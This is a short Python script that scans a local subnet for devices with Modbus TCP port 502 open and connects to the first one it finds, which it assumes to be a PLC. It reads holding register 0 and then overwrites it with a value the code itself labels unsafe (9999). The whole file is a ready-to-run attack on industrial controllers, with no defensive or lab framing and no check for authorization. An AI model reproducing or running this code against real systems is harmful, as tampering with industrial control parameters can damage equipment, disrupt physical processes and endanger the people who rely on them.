import socket
import struct
import ipaddress
from pyModbusTCP.client import ModbusClient

# Function to find the PLC IP address by scanning for Modbus TCP (port 502)
def find_plc_ip(network_range="192.168.1.0/24"):
    print("[*] Scanning for PLC devices...")
    for ip in ipaddress.IPv4Network(network_range, strict=False):
        ip_str = str(ip)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.3)  # Fast scanning timeout
        result = sock.connect_ex((ip_str, 502))
        sock.close()
        if result == 0:
            print(f"[+] Potential PLC found at {ip_str}")
            return ip_str
    return None

# Function to modify a critical parameter in the PLC
def modify_plc_parameter(plc_ip, register_address=0, unsafe_value=9999):
    print(f"[*] Connecting to PLC at {plc_ip}...")
    client = ModbusClient(host=plc_ip, port=502, auto_open=True)

    if client.open():
        print(f"[+] Connected to PLC at {plc_ip}")

        # Read existing value first
        old_value = client.read_holding_registers(register_address, 1)
        if old_value:
            print(f"[!] Current register {register_address} value: {old_value[0]}")
        else:
            print("[!] Failed to read original parameter value")

        # Writing an unsafe value
        if client.write_single_register(register_address, unsafe_value):
            print(f"[!!!] Successfully modified register {register_address} to {unsafe_value}")
        else:
            print("[X] Failed to write new value")

        client.close()
    else:
        print(f"[X] Failed to connect to PLC at {plc_ip}")

# Main Execution
if __name__ == "__main__":
    plc_ip = find_plc_ip()

    if plc_ip:
        modify_plc_parameter(plc_ip)
    else:
        print("[X] No PLC device found on the network.")